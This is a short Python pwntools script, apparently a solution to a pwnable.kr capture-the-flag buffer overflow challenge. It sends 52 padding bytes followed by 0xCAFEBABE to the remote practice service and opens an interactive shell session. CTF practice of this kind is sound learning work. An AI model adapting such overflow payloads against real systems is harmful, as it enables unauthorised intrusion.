from pwn import *

payload = b"A" * 52 + p32(0xCAFEBABE)
p = remote('pwnable.kr', 9000)
p.sendline(payload)
p.interactive()
